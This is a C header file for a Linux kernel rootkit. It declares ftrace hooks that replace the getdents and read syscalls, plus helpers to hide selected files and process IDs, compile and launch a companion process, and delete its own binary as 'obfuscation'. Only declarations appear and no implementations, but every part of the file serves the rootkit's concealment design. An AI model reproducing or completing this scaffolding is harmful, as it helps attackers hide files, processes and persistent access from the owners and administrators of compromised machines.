#ifndef ROOTKIT_H
# define ROOTKIT_H

# include <linux/init.h>
# include <linux/module.h>
# include <linux/syscalls.h>
# include <linux/kernel.h>
# include <linux/kallsyms.h>
# include <asm/unistd.h>
# include <linux/smp.h>
# include <linux/preempt.h>
# include <linux/vmalloc.h>
# include <linux/ftrace.h>
# include <linux/dirent.h>
# include <linux/fs.h>
# include <linux/string.h>
# include <linux/ctype.h>
# include <linux/file.h>
# include <linux/stat.h>
# include <linux/sched/signal.h>
# include <linux/namei.h>

// https://www.intel.com/content/www/us/en/docs/dpcpp-cpp-compiler/developer-guide-reference/2024-1/foptimize-sibling-calls.html
# pragma GCC optimize("-fno-optimize-sibling-calls")

typedef struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
} t_ftrace_hook;

extern	int g_pid_companion;
extern	t_ftrace_hook *g_f_hook[];
extern	struct workqueue_struct *g_delayed_init_wq;
extern	struct delayed_work g_delayed_init_work;

asmlinkage long myGetDents(const struct pt_regs *regs);
asmlinkage long myRead(const struct pt_regs *regs);

int fh_install_hook(t_ftrace_hook *hook);
void fh_remove_hook(t_ftrace_hook *hook);
extern asmlinkage long (*g_original_getdents)(const struct pt_regs *);
extern asmlinkage long (*g_original_read)(const struct pt_regs *);

/* Obfucation */
void compile_companion(void);
void delete_binary(void);
void launch_companion(void);
void get_pid_companion(void);
bool is_current_file_to_hide(char *filename);
bool is_a_pid_to_hide(char *filename);
int loop_current_dirent (int size_dirent, struct linux_dirent64 __user *dirent);


/* Delayed Utils */
bool is_system_ready(void);
void delayed_module_init_work(struct work_struct *work);

#endif
